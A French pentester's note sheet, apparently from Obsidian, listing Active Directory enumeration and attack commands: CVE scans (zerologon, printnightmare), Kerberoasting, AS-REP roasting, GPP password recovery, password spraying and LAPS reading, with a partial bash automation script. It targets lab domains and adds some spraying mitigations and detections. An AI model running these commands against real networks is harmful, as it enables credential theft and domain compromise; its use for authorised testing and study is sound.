
## Infos à collecter #Checklist

1. [ ] [[#1. Identifier les hôtes]]
2. [ ] [[#2. Identifier les CVEs]]
3. [ ] [[#2. Identifier les Users|AD Users]] 
4. [ ] [[#3. Identifier les Groups|AD Groups]]
5. [ ] [[#3. Identifier les Computers]]
6. [ ] [[#4. Description des users|Description des users]]  
7. [ ] [[#5. Users avec le PASSWD_NOTREQD Field|Users avec le passwd_notreqd]]
8. [ ] [[#10. Identifier les Users à privilèges|Users à privilèges ?]]
9. [ ] [[#6. Identifier les Shares|Shares]]
10. [ ] [[#7. Users Kerberoastables / ASREP Roastables|Users Kerberoastables / ASREP roastables]]
11. [ ] [[#Computers Timeroastables]]
12. [ ] [[#8. Identifier les GPP Passwords|GPP Passwords]]
13. [ ] [[#9. Identifier les GPOs|GPO]]
14. [ ] [[#11. Identifier les vulnérabilités potentielles|Services et hôtes vulnérables (Legacy)]]
15. [ ] [[#12. Identifier la politique de mot de passe|Politique de mots de passe]]
16. [ ] [[#13. Password spraying]]
17. [ ] [[#Identifier les gMSA]]
18. [ ] [[#Identifier les délégations contraintes et non contraintes]]
19. [ ] [[#14. Identifier les contrôles de sécurité|Contrôles de sécurité]]
20. [ ] [[#15. Identifier les ACEs/ACLs|ACEs/ACLs]] 
21. [ ] [[#16. Identifier les Relations d'approbations|Relations d'approbations (Trust Relationships)]]
22. [ ] [[#Script BASH fait maison pour automatiser l'énum]]


> [!TIP]
> Dès que des identifiants valides sont récupérés -> utiliser [[BLOODHOUND]] pour automatiser la collecte des données et identifier les chemins d'attaque

## **TOOLS**

- [[BLOODHOUND]] 
- [[POWERVIEW]] (WINDOWS)
- [[NETEXEC]]
- [[SHARPVIEW]] (WINDOWS)
- [[SNAFFLER (SHARES)]] (WINDOWS)
- [[ADRECON]] (WINDOWS)



# ENUMERATION AVEC TOOLS


# 1. Identifier les hôtes

### 1.1 Table ARP

Identifier le voisinage dans la table ARP de la machine

```cmd
arp -a
```

### 1.2 Connexions actives

Peut également identifier d'autres sous réseaux.

```cmd
netstat -ano
```


### 1.3 Capture du trafic

De manière passive en capturant le trafic réseau, filtrer sur le Protocol ARP afin d'identifier les IP, puis MDNS afin d'identifier des noms de machines.

*Wireshark*

```shell
sudo -E wireshark
```

*Tcpdump*

```shell-session
sudo tcpdump -i ens224 
```

*Pktmon*


Analyse supplémentaire avec Responder

```bash
sudo responder -I ens224 -A 
```

```bash
sudo responder -I ens224
```


Laisser tourner un tcpdump sur une journée complète également afin d'identifier des creds potentiels.

```shell-session
sudo tcpdump -i ens224 -w capture.pcap
```



### 1.4 Ping sweep

Identifier les hôtes de manière active avec un ping sweep

*fping*

https://fping.org/

```shell
fping -asgq 172.16.5.0/23
```

script bash

```bash
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done > hosts_up
```


```bash
cat hosts_up | awk '{print $4}' | tr -d : > hosts.txt
```

script cmd

```cmd
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

Script Powershell

```powershell
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
```


### 1.5 Scan NMAP

Scanner les ports ouverts sur les machines identifiées avec NMAP

```bash
sudo nmap -v -sS -sV -iL hosts.txt -oA host-enum
```

Scanner les ports ouverts sur le réseau complet

```bash
sudo nmap -v -sS -sV 192.168.110.0/24 -oA host-enum
```

---
# 2. Identifier les CVEs


Tester toutes les vuln connues (noPAC requiert des identifiants)

```bash
nxc smb 172.16.1.20 -u '' -p '' -d DANTE.LOCAL --dns-server 172.16.1.20 -M zerologon -M nopac -M printnightmare -M smbghost -M ms17-010 -M coerce_plus
```

---
# 2. Identifier les Users


> [!TIP]
> Créer liste avec les users identifiés pour le password spraying

https://github.com/initstring/linkedin2username

# Linux
## Sans creds

### *ENUM4LINUX NULL SESSION*

```shell
enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]" > valid_users
```

### *RPCCLIENT NULL SESSION*

```shell
rpcclient -U "" -N 172.16.5.5
```

```shell-session
enumdomusers 
```


### *NETEXEC NULL SESSION*

```shell
nxc ldap 172.16.5.5 -u '' -p '' --users
```

```shell
nxc smb 172.16.5.5 -u '' -p '' --users
```


### *LDAPSEARCH ANONYMOUS BIND*

```shell
ldapsearch -H ldap://172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
```

### *WINDAPSEARCH NULL BIND*

```shell
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
```

### *KERBRUTE* 

https://github.com/ropnop/kerbrute

```bash
kerbrute userenum --dc <ip> -d <domain> <userlist>
```

### *NMAP*

```bash
nmap -p 88 --script="krb5-enum-users" --script-args="krb5-enum-users.realm='$DOMAIN',userdb=$WORDLIST" $IP_DC
```

### *Bruteforce* *RID*

```bash
nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --rid-brute
```

```BASH
for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
```

```BASH
impacket-samrdump 10.129.14.128
```


## Avec Creds

### *NETEXEC*

```shell
nxc ldap 172.16.5.5 -u 'user' -p 'pass' --users > valid_users
```

Mise en forme du fichier

```bash
cat valid_users | awk '{print $5}' | sed "/^\[\*\]/d" | sed "/^\[+\]/d" | sed '/^-Username-/d'  > users
```


### *WINDAPSEARCH*

Identifier les Admins du domaine

```shell-session
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
```

Identifier les utilisateurs à privilèges

```shell-session
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
```


# Windows

## ActiveDirectory PowerShell Module (RSAT)

https://learn.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps

Afficher les modules

```powershell
Get-Module
```

Importer le module AD

```powershell-session
Import-Module ActiveDirectory
```

Récupérer les infos du domaine

```powershell
Get-ADDomain
```

Récupérer les users

```powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

Récupérer les relations de confiance

```powershell
Get-ADTrust -Filter *
```



---
# 3. Identifier les Groups


### *ENUM4LINUX*

```shell
enum4linux -U 172.16.5.5  | grep "group:" | cut -f2 -d"[" | cut -f1 -d"]" > domain_groups
```

### *RPCCLIENT*

```shell
rpcclient -U user 172.16.5.5
```

```shell-session
enumdomgroups
```


### LDAPSEARCH AVEC CREDS

```sh
ldapsearch -H ldap://10.10.11.75 -D user@domain.local -w '$PASSWORD' -x -b "DC=RUSTYKEY,DC=HTB" -s sub "(&(objectclass=group))" | grep sAMAccountName: | cut -f2 -d":" > groups
```

### *LDAPSEARCH ANONYMOUS BIND*

```shell
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=group))"  | grep sAMAccountName: | cut -f2 -d":" > groups
```

### *WINDAPSEARCH NULL BIND*

```shell
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
```


# Windows

## ActiveDirectory PowerShell Module (RSAT)

```powershell-session
Get-ADGroup -Filter * | select name
```

Infos détaillées sur un groupe

```powershel
 Get-ADGroup -Identity "Backup Operators"
```


---
# 3. Identifier les Computers

## Linux

anonymous bind

```shell
ldapsearch -H ldap://172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=computer))" | grep sAMAccountName: | cut -f2 -d":" -d " "
 > computers
```

avec creds

```sh
ldapsearch -H ldap://10.10.11.75 -D user@domain.local -w '8#t5HE8L!W3A' -x -b "DC=RUSTYKEY,DC=HTB" -s sub "(&(objectclass=computer))" | grep sAMAccountName: | cut -f2 -d":" -d " "
 > computers
```


## Windows

PowerView

```powershell
Get-DomainComputer
```

---
# 4. Description des users

> [!TIP]
> Des mots de passes peuvent se trouver dans les descriptions utilisateurs


## LINUX

### Netexec

```bash
nxc ldap <hostname> -u <user> -p <pass> -M get-desc-users
```


## WINDOWS

### PowerView

```powershell-session
Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}
```



---
# 5.  Users avec le PASSWD_NOTREQD Field

> [!TIP]
> Ne signifie pas forcément que le mot de passe est vide mais le compte ne se soumet pas à la politique de mots de passe en place.
> Tester mots de passe vides pour ces comptes


## WINDOWS

### PowerView

```powershell
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```


---
# 6. Identifier les Shares

> [!TIP]
> Rechercher des creds dans les fichiers



[[3. Protocoles#SMB (139,445)]]


---

# 7. Users Kerberoastables / ASREP Roastables

[[1. KERBEROASTING]]

```bash
nxc ldap ctf05.root-me.org -u pentest -p Pent3st123! --kdcHost ctf05.root-me.org --kerberoasting SPNs.txt
```

[[2. AS-REP ROASTING]]

```bash
nxc ldap ctf05.root-me.org -u users -p '' --kdcHost ctf05.root-me.org --asreproast ASREP.txt
```


---
# Computers Timeroastables


[[TIMEROASTING]]

```bash
nxc smb 10.10.11.31 -M timeroast | grep 'sntp-ms' | cut -f2 -d":" > timeroast.hashes
```



---
# 8. Identifier les GPP Passwords

> [!TIP]
> Mot de passe chiffré dans .xml avec cette clé ->
> 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b


## LINUX

### Netexec

```bash
nxc smb <hostname> -u <user> -p <pass> -M gpp_password
```

```bash
nxc smb <hostname> -u <user> -p <pass> -M gpp_autologin
```

### Impacket

```bash
sudo impacket-Get-GPPPassword domain/user@ip
```


## WINDOWS

### Get-GPPPassword

https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1



---
# 9. Identifier les GPOs


## WINDOWS

### Powershell

```powershell
Get-GPO -All | Select DisplayName
```

### PowerView

```powershell
Get-DomainGPO |select displayname
```


Identifier les ACL pour un user/group sur une GPO

```powershell
$sid=Convert-NameToSid "Domain Users"
```

```powershell
Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
```

Convertir le GUID pour afficher le nom de la GPO

```powershell
Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
```




---
# 10. Identifier les Users à privilèges


- PSRemoting (WINRM)
- RDP
- SQL Admin
- AdminCount1
- [[#Backup Operators]]
- [[#Event Log Readers]]
- [[#DnsAdmin]]
- [[#Hyper-V Administrator]]
- [[#Print Operators]]
- [[#Server Operators]]
- Account Operators


[[POWERVIEW#2. Enumérer les users à privilèges]]

[[BLOODHOUND#Trouver les users qui peuvent PSRemote / RDP]]
[[BLOODHOUND#Trouver SQLAdmin]]


AdminCount1:

```bash
nxc ldap 192.168.255.131 -u adm -p pass --admin-count
```

PsRemote

```sh
ldapsearch -H ldap://$dc_hostname -D $user@$domain -w $password -x -b "DC=RUSTYKEY,DC=HTB" "(cn=Remote Management Users)" member | grep member: | cut -d',' -f1 | cut -d'=' -f2
```

```sh
nxc ldap $dc_hostname -u $user -k --kdcHost $dc_hostname --use-kcache --query "(cn=Remote Management Users)" member | grep member | cut -d',' -f1 | cut -d'=' -f2)
```


RDP

```sh
ldapsearch -H ldap://$dc_hostname -D $user@$domain -w $password -x -b "DC=RUSTYKEY,DC=HTB" "(cn=Remote Desktop Users)" member | grep member: | cut -d',' -f1 | cut -d'=' -f2
```

SQL Admins

```sh
ldapsearch -H ldap://$dc_hostname -D $user@$domain -w $password -x -b "DC=RUSTYKEY,DC=HTB" "(cn=*SQL*)" member | grep member: | cut -d',' -f1 | cut -d'=' -f2
```

Backup Operators

```sh
ldapsearch -H ldap://$dc_hostname -D $user@$domain -w $password -x -b "DC=RUSTYKEY,DC=HTB" "(cn=Backup Operators)" member | grep member: | cut -d',' -f1 | cut -d'=' -f2
```

Event Log Readers

```sh
ldapsearch -H ldap://$dc_hostname -D $user@$domain -w $password -x -b "DC=RUSTYKEY,DC=HTB" "(cn=Event Log Readers)" member | grep member: | cut -d',' -f1 | cut -d'=' -f2
```

DnsAdmin

```sh
ldapsearch -H ldap://$dc_hostname -D $user@$domain -w $password -x -b "DC=RUSTYKEY,DC=HTB" "(cn=DnsAdmin)" member | grep member: | cut -d',' -f1 | cut -d'=' -f2
```

Hyper-V Administrators

```sh
ldapsearch -H ldap://$dc_hostname -D $user@$domain -w $password -x -b "DC=RUSTYKEY,DC=HTB" "(cn=Hyper-V Administrators)" member | grep member: | cut -d',' -f1 | cut -d'=' -f2
```

Print Operators

```sh
ldapsearch -H ldap://$dc_hostname -D $user@$domain -w $password -x -b "DC=RUSTYKEY,DC=HTB" "(cn=Print Operators)" member | grep member: | cut -d',' -f1 | cut -d'=' -f2
```

Server Operators

```sh
ldapsearch -H ldap://$dc_hostname -D $user@$domain -w $password -x -b "DC=RUSTYKEY,DC=HTB" "(cn=Server Operators)" member | grep member: | cut -d',' -f1 | cut -d'=' -f2
```

Account Operators

```sh
ldapsearch -H ldap://$dc_hostname -D $user@$domain -w $password -x -b "DC=RUSTYKEY,DC=HTB" "(cn=Account Operators)" member | grep member: | cut -d',' -f1 | cut -d'=' -f2
```


---

# 11. Identifier les vulnérabilités potentielles


> [!TIP]
> Être NT AUTHORITE\SYSTEM est quasiment équivalent à avoir un compte utilisateur de domaine car il permet d'énumérer le domaine en usurpant le compte de machine.
> - Enumerate the domain using built-in tools or offensive tools such as BloodHound and PowerView.
>  - Perform Kerberoasting / ASREPRoasting attacks within the same domain.
>  - Run tools such as Inveigh to gather Net-NTLMv2 hashes or perform SMB relay attacks.
>  - Perform token impersonation to hijack a privileged domain user account.
>  - Carry out ACL attacks.


https://www.netexec.wiki/smb-protocol/scan-for-vulnerabilities

[[OFFSEC/PENTEST/2. INFRA/6. POST EXPLOITATION/2. WINDOWS/1. PRIVESC/1. Enumération initiale|WINDOWS PRIVESC]]

[[OFFSEC/PENTEST/2. INFRA/6. POST EXPLOITATION/1. LINUX/2. PRIVESC|LINUX PRIVESC]]

[[LLMNR, NBT-NS Poisoning & SMB Relay - T1557.001]]


---

# 12. Identifier la politique de mot de passe


> [!TIP]
> Par défaut la politique de mot de passe est de 7 caractères.
> Complexité = Maj + Min + Chiffre + Caractère spe
> Reformatter wordlist > [[Wordlists & Rules#Reformatter wordlist]]



| Policy                                      | Default Value |
| ------------------------------------------- | ------------- |
| Enforce password history                    | 24 days       |
| Maximum password age                        | 42 days       |
| Minimum password age                        | 1 day         |
| Minimum password length                     | 7             |
| Password must meet complexity requirements  | Enabled       |
| Store passwords using reversible encryption | Disabled      |
| Account lockout duration                    | Not set       |
| Account lockout threshold                   | 0             |
| Reset account lockout counter after         |               |
## Depuis LINUX

### *NETEXEC*

avec Creds

```shell
nxc smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
```

Sans creds

```shell
nxc smb 172.16.5.5 -u '' -p '' --pass-pol
```

### *RPCCLIENT*

sans creds (null session)

```shell
rpcclient -U "" -N 172.16.5.5
```

```shell-session
querydominfo
```

```shell-session
getdompwinfo
```

### *Enum4Linux*

```shell-session
enum4linux -P 172.16.5.5
```

### *Enum4Linux-ng*

```shell
enum4linux-ng -P 172.16.5.5 -oA ilfreight
```

### *LDAPSEARCH*

Session anonyme LDAP

```shell
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```


## Depuis WINDOWS

### *NET*

Tester null session

```cmd
net use \\DC01\ipc$ "" /u:""
```

Tester Guest session

```cmd-session
net use \\DC01\ipc$ "password" /u:guest
```

Avec creds

```cmd
net accounts
```


### *POWERVIEW*

```powershell-session
import-module .\PowerView.ps1
Get-DomainPolicy
```


---

# 13. Password / Hash spraying


> [!TIP]
> Tester un mot de passe pour tous les utilisateurs.
> Tester tous les protocoles.

## Depuis Linux

### *NETEXEC*

```shell
nxc smb 172.16.5.5 -u valid_users.txt -p Password123 --continue-on-success | grep +
```

Local-auth

```shell
nxc smb 172.16.5.5 -u valid_users.txt -p Password123 --continue-on-success --local-auth | grep +
```

Kerberos

```shell
nxc smb 172.16.5.5 -u valid_users.txt -p Password123 --continue-on-success -k --kdcHost 172.16.5.5 | grep +
```

### *RPCCLIENT*

boucle for

```shell
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

### *KERBRUTE*

> [!Important]
> Attention s'arrête au premier valide

```shell
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```


## Depuis Windows

### *DOMAINPASSWORDSPRAY*

https://github.com/dafthack/DomainPasswordSpray

```powershell
Import-Module .\DomainPasswordSpray.ps1
```

```powershell
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

### *KERBRUTE*

> [!Important]
> Attention s'arrête au premier valide

```shell
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```



## MITIGATIONS


|Technique|Description|
|---|---|
|`Multi-factor Authentication`|Multi-factor authentication can greatly reduce the risk of password spraying attacks. Many types of multi-factor authentication exist, such as push notifications to a mobile device, a rotating One Time Password (OTP) such as Google Authenticator, RSA key, or text message confirmations. While this may prevent an attacker from gaining access to an account, certain multi-factor implementations still disclose if the username/password combination is valid. It may be possible to reuse this credential against other exposed services or applications. It is important to implement multi-factor solutions with all external portals.|
|`Restricting Access`|It is often possible to log into applications with any domain user account, even if the user does not need to access it as part of their role. In line with the principle of least privilege, access to the application should be restricted to those who require it.|
|`Reducing Impact of Successful Exploitation`|A quick win is to ensure that privileged users have a separate account for any administrative activities. Application-specific permission levels should also be implemented if possible. Network segmentation is also recommended because if an attacker is isolated to a compromised subnet, this may slow down or entirely stop lateral movement and further compromise.|
|`Password Hygiene`|Educating users on selecting difficult to guess passwords such as passphrases can significantly reduce the efficacy of a password spraying attack. Also, using a password filter to restrict common dictionary words, names of months and seasons, and variations on the company's name will make it quite difficult for an attacker to choose a valid password for spraying attempts.|

## DETECTIONS

Parmi les indicateurs d'attaques externes par pulvérisation de mot de passe, on peut citer de nombreux blocages de comptes sur une courte période, des journaux de serveurs ou d'applications montrant de nombreuses tentatives de connexion avec des utilisateurs valides ou inexistants, ou de nombreuses requêtes sur une courte période vers une application ou une URL spécifique.

Dans le journal de sécurité du contrôleur de domaine, de nombreuses instances de l'événement ID 4625 : Un compte n'a pas réussi à se connecter sur une courte période peut indiquer une attaque par pulvérisation de mot de passe. Les organisations devraient disposer de règles permettant de corréler de nombreux échecs de connexion dans un intervalle de temps donné afin de déclencher une alerte. Un attaquant plus avisé peut éviter la pulvérisation de mots de passe SMB et cibler plutôt LDAP. Les organisations doivent également surveiller l'événement ID 4771 : Kerberos pre-authentication failed, qui peut indiquer une tentative de pulvérisation de mot de passe LDAP. Pour ce faire, elles devront activer la journalisation Kerberos. Ce billet détaille la recherche autour de la détection de la pulvérisation de mot de passe à l'aide de la journalisation des événements de sécurité Windows.

Avec ces mesures d'atténuation finement ajustées et la journalisation activée, une organisation sera bien placée pour détecter et se défendre contre les attaques de pulvérisation de mot de passe internes et externes.


---
# Identifier les gMSA

## Linux

```bash
nxc ldap dc01.infiltrator.htb -u l.clark -p WAT?watismypass! -k --gmsa
```


---
# Identifier les délégations contraintes et non contraintes

## Linux


Contraintes

```
nxc ldap 192.168.56.11 -u eddard.stark -p FightP3aceAndHonor! --find-delegation
```

Non contraintes

```
nxc ldap 192.168.0.104 -u harry -p pass --trusted-for-delegation
```

---
# 14. Identifier les contrôles de sécurité

## En remote

Identifier AV en place 

```bash
nxc smb <ip> -u user -p pass -M enum_av
```


## En local
### Windows Defender

Identifier si Defender est actif

```powershell
Get-MpComputerStatus
```


### Applocker

Identifier les règles applocker en place 

```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```


### PowerShell Constrained Language Mode

Permet de restreindre l'utilisation de fonctionnalités PowerShell (COM objects, certains types de fichiers...)

```powershell
$ExecutionContext.SessionState.LanguageMode
```


### LAPS

#### BloodyAD

```
bloodyAD --host $DC_IP -d $DOMAIN -u $USER -p $PASSWORD get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```

#### LAPSToolkit

https://github.com/leoloobeek/LAPSToolkit

Identifier les groupes délégués pouvant lire les mots de passe LAPS

```powershell
Find-LAPSDelegatedGroups
```

Identifier les comptes ayant les "AdmPwdExtendedRights" pouvant lire les mots de passe LAPS

```powershell
Find-AdmPwdExtendedRights
```

Identifier les machines utilisant LAPS (récupère les mots de passe si le user à les droits)

```Powershell
Get-LAPSComputers
```



---

# 15. Identifier les ACEs/ACLs

ACEs intéressantes

- `ForceChangePassword` abused with `Set-DomainUserPassword`
- `Add Members` abused with `Add-DomainGroupMember`
- `GenericAll` abused with `Set-DomainUserPassword` or `Add-DomainGroupMember`
- `GenericWrite` abused with `Set-DomainObject`
- `WriteOwner` abused with `Set-DomainObjectOwner`
- `WriteDACL` abused with `Add-DomainObjectACL`
- `AllExtendedRights` abused with `Set-DomainUserPassword` or `Add-DomainGroupMember`
- `Addself` abused with `Add-DomainGroupMember`

## Depuis Linux

### 1. Avec [[BLOODHOUND#2.3. ACLs|BLOODHOUND]]


## Depuis Windows 

### 1. Avec [[BLOODHOUND#2.3. ACLs|BLOODHOUND]]
### 2. Avec [[POWERVIEW#3. ACLs (Access Control List)|POWERVIEW]]
### 3. Avec [[ADRECON]]


---

# 16. Identifier les Relations d'approbations



## Depuis Windows 

### Powershell Active Directory

```powershell
Import-Module activedirectory
```

```powershell
Get-ADTrust -Filter *
```

### Netdom

Identifier les relations d'approbation

```cmd
netdom query /domain:inlanefreight.local trust
```

Identifier le DC

```cmd
netdom query /domain:logistics.inlanefreight.local dc
```

Identifier les workstations / server

```cmd
netdom query /domain:logistics.inlanefreight.local workstation
```

### 1. Avec [[BLOODHOUND#4. Trust Relationships|BLOODHOUND]]
### 2. Avec [[POWERVIEW#4. Trust Relationships|POWERVIEW]]


---

# 17. Identifier les objets supprimés

> [!TIP]
> Si accès à une machine qui a le module Active DIrectory, énumérer les objets supprimés et tenter de les restaurer.
> Compte admin particulier ??


1. Identifier les objets supprimés

```
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```


----
# Script BASH fait maison pour automatiser l'énum

```bash
#!/bin/bash

# Check for given arguments
if [ $# -ne 6 ]
then
	echo -e -e "You need to specify the domain, DC hostname, DC ip, user, password between simple quotes and auth protocol (NTLM/KERBEROS).\n"
	echo -e -e "Usage:"
	echo -e -e "\t$0 <domain.local> <dc_hostname> <dc_ip> <user> '<password>' <auth_protocol>"
	exit 1
else
	domain=$1
	dc_hostname=$2
	dc_ip=$3
	user=$4
	password=$5
	auth_protocol=$6
	base_dn=$(echo -e "$domain" | sed -E 's/([^.]+)(\.|$)/DC=\U\1\E,/g;s/,$//') # Transform domain.local to DC=DOMAIN,DC=LOCAL
fi

# COLORS

NOCOLOR='\033[0m'
RED='\033[1;31m'
GREEN='\033[1;32m'
CYAN='\033[1;36m'
YELLOW='\033[1;33m'
PURPLE='\033[1;35m'


# FUNCTIONS

function result {
	if [ $? -eq 0 ]
	then
		echo -e "\n$GREEN Command successfull $NOCOLOR\n"
	else
		echo -e "\n$RED Command failed, status code : $?\n"
	fi
}

function clock_sync {
	sudo ntpdate $dc_ip
	result
}

function get_TGT {
	impacket-getTGT $domain/$user:$password -dc-ip $dc_hostname
	export KRB5CCNAME=$user.ccache
	result
}

function collect_Bloodhound_data {	
	if [ $auth_protocol == "KERBEROS" ]
	then
		nxc ldap $dc_ip -u $user -p $password -d $domain -k --kdcHost $dc_hostname --dns-server $dc_ip --bloodhound --collection All
	else
		nxc ldap $dc_ip -u $user -p $password -d $domain --kdcHost $dc_hostname --dns-server $dc_ip --bloodhound --collection All
	fi
	
	latest_zip=$(ls -t /home/$USER/.nxc/logs/*_bloodhound.zip | head -n1) # find the latest bloodhound zip
	cp "$latest_zip" . # copy it to the current directory
	
	result
}

function get_AD_users {
	if [ $auth_protocol == "KERBEROS" ]
	then
		nxc ldap $dc_hostname -u $user -p $password -k --users | awk '{print $5}' | sed "/^\[\*\]/d" | sed "/^\[+\]/d" | sed '/^-Username-/d'  > ad_users.txt
	else
		nxc ldap $dc_ip -u $user -p $password --users | awk '{print $5}' | sed "/^\[\*\]/d" | sed "/^\[+\]/d" | sed '/^-Username-/d'  > ad_users.txt
	fi
	result
	echo -e "$GREEN AD users collected in ad_users.txt $NOCOLOR"
}

function get_AD_groups {
	if [ $auth_protocol == "KERBEROS" ]
	then
		nxc ldap $dc_hostname -u $user -k --kdcHost $dc_hostname --use-kcache --query "(objectclass=group)" "" | grep sAMAccountName | grep -oP '(?<=sAMAccountName       ).*' > ad_groups.txt
	else
		ldapsearch -H ldap://$dc_ip -D $user@$domain -w $password -x -b "$base_dn" -s sub "(&(objectclass=group))" | grep sAMAccountName: | cut -f2 -d":" > ad_groups.txt
	fi
	result
	echo -e "$GREEN AD groups collected in ad_groups.txt $NOCOLOR"
}

function get_AD_computers {
	if [ $auth_protocol == "KERBEROS" ]
	then
		nxc ldap $dc_hostname -u $user -k --kdcHost $dc_hostname --use-kcache --query "(objectclass=computer)" "" | grep sAMAccountName | grep -oP '(?<=sAMAccountName       ).*' > ad_computers.txt
	else
		ldapsearch -H ldap://$dc_ip -D $user@$domain -w $password -x -b "$base_dn" -s sub "(&(objectclass=computer))" | grep sAMAccountName: | cut -f2 -d":" -d" " > ad_computers.txt
	fi
	result
	echo -e "$GREEN AD computers collected in ad_computers.txt $NOCOLOR"
}

function get_AD_users_desc {
	if [ $auth_protocol == "KERBEROS" ]
	then
		nxc ldap $dc_hostname -u $user -p $password -k -M get-desc-users > ad_users_desc.txt
	else
		nxc ldap $dc_ip -u $user -p $password -M get-desc-users > ad_users_desc.txt
	fi
	result
	echo -e "$GREEN AD users descriptions collected in ad_users_desc.txt $NOCOLOR"
}

function get_privileged_users {
	if [ $auth_protocol == "KERBEROS" ]
	then
		admin_count_users=$(nxc ldap $dc_hostname -u $user -p $password -k --admin-count | awk '{print $5}' | sed "/^\[\*\]/d" | sed "/^\[+\]/d" | sed '/^-Username-/d')
		psremote_users=$(nxc ldap $dc_hostname -u $user -k --kdcHost $dc_hostname --use-kcache --query "(cn=Remote Management Users)" member | grep member | cut -d',' -f1 | cut -d'=' -f2)
		rdp_users=$(nxc ldap $dc_hostname -u $user -k --kdcHost $dc_hostname --use-kcache --query "(cn=Remote Desktop Users)" member | grep member | cut -d',' -f1 | cut -d'=' -f2)
		sqladmin_users=$(nxc ldap $dc_hostname -u $user -k --kdcHost $dc_hostname --use-kcache --query "(cn=*SQL*)" member | grep member | cut -d',' -f1 | cut -d'=' -f2)
		backup_operators=$(nxc ldap $dc_hostname -u $user -k --kdcHost $dc_hostname --use-kcache --query "(cn=Backup Operators)" member | grep member | cut -d',' -f1 | cut -d'=' -f2)
		event_log_readers=$(nxc ldap $dc_hostname -u $user -k --kdcHost $dc_hostname --use-kcache --query "(cn=Event Log Readers)" member | grep member | cut -d',' -f1 | cut -d'=' -f2)
		dns_admins=$(nxc ldap $dc_hostname -u $user -k --kdcHost $dc_hostname --use-kcache --query "(cn=DnsAdmin)" member | grep member | cut -d',' -f1 | cut -d'=' -f2)
		hyperv_admins=$(nxc ldap $dc_hostname -u $user -k --kdcHost $dc_hostname --use-kcache --query "(cn=Hyper-V Administrators)" member | grep member | cut -d',' -f1 | cut -d'=' -f2)
		print_operators=$(nxc ldap $dc_hostname -u $user -k --kdcHost $dc_hostname --use-kcache --query "(cn=Print Operators)" member | grep member | cut -d',' -f1 | cut -d'=' -f2)
		server_operators=$(nxc ldap $dc_hostname -u $user -k --kdcHost $dc_hostname --use-kcache --query "(cn=Server Operators)" member | grep member | cut -d',' -f1 | cut -d'=' -f2)
		account_operators=$(nxc ldap $dc_hostname -u $user -k --kdcHost $dc_hostname --use-kcache --query "(cn=Account Operators)" member | grep member | cut -d',' -f1 | cut -d'=' -f2)
		
	else
		admin_count_users=$(nxc ldap $dc_ip -u $user -p $password --admin-count | awk '{print $5}' | sed "/^\[\*\]/d" | sed "/^\[+\]/d" | sed '/^-Username-/d')
		psremote_users=$(ldapsearch -H ldap://$dc_hostname -D $user@$domain -w $password -x -b "$base_dn" "(cn=Remote Management Users)" member | grep member: | cut -d',' -f1 | cut -d'=' -f2)
		rdp_users=$(ldapsearch -H ldap://$dc_hostname -D $user@$domain -w $password -x -b "$base_dn" "(cn=Remote Desktop Users)" member | grep member: | cut -d',' -f1 | cut -d'=' -f2)
		sqladmin_users=$(ldapsearch -H ldap://$dc_hostname -D $user@$domain -w $password -x -b "$base_dn" "(cn=*SQL*)" member | grep member: | cut -d',' -f1 | cut -d'=' -f2)
		backup_operators=$(ldapsearch -H ldap://$dc_hostname -D $user@$domain -w $password -x -b "$base_dn" "(cn=Backup Operators)" member | grep member: | cut -d',' -f1 | cut -d'=' -f2)
		event_log_readers=$(ldapsearch -H ldap://$dc_hostname -D $user@$domain -w $password -x -b "$base_dn" "(cn=Event Log Readers)" member | grep member: | cut -d',' -f1 | cut -d'=' -f2)
		dns_admins=$(ldapsearch -H ldap://$dc_hostname -D $user@$domain -w $password -x -b "$base_dn" "(cn=DnsAdmin)" member | grep member: | cut -d',' -f1 | cut -d'=' -f2)
		hyperv_admins=$(ldapsearch -H ldap://$dc_hostname -D $user@$domain -w $password -x -b "$base_dn" "(cn=Hyper-V Administrators)" member | grep member: | cut -d',' -f1 | cut -d'=' -f2)
